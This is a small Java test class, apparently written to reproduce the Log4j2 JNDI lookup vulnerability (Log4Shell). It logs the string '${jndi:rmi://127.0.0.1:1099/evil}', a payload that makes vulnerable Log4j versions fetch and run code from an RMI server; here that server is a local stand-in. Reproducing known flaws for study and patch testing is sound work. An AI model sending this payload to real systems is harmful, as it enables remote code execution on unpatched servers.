package com.wky.demo.log4j2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author: wangkunyang
 * @date 2021/12/13 10:15
 */
public class TestBug {

    public static final Logger logger = LogManager.getLogger(TestBug.class);

    public static void main(String[] args) {
//        String param = "${java:version}";
        String param = "${jndi:rmi://127.0.0.1:1099/evil}";

        logger.error("test bug : {}", param);
    }

}
